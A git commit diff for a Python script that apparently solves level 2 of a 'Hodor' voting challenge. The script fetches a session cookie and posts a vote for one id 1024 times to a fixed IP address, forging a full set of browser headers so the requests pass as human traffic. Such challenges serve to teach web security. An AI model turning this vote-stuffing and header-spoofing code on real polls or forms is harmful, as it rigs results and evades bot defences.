cef88d941eb4e0b05428597996ba3867d50d6329
yawzyag <yesid.yag@gmail.com>
2019-06-09 18:46:41 -0500

    [Feature] adding hodor 2

--- level_2/hodor_2.py
+++ level_2/hodor_2.py
@@ -5,9 +5,18 @@ import requests
 for i in range(1024):
     r = requests.get("http://158.69.76.135/level2.php")
     galleta = r.cookies['HoldTheDoor']
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0', 'Referer': 'http://158.69.76.135/level2.php'}
+    headers = {'Host': '158.69.76.135',
+               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0',
+               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+               'Accept-Language': 'en-US,en;q=0.5',
+               'Accept-Encoding': 'gzip, deflate',
+               'Referer': 'http://158.69.76.135/level2.php',
+               'Content-Type': 'application/x-www-form-urlencoded',
+               'Connection': 'keep-alive',
+               'Upgrade-Insecure-Requests': 1,
+               'Pragma': 'no-cache',
+               'Cache-Control': 'no-cache'}
 
     payload = {'id': 766, 'holdthedoor': 'Submit', 'key': galleta}
     r1 = requests.post("http://158.69.76.135/level2.php", data=payload,
-                    cookies={'HoldTheDoor': galleta}, headers=headers)
+                       cookies={'HoldTheDoor': galleta}, headers=headers)
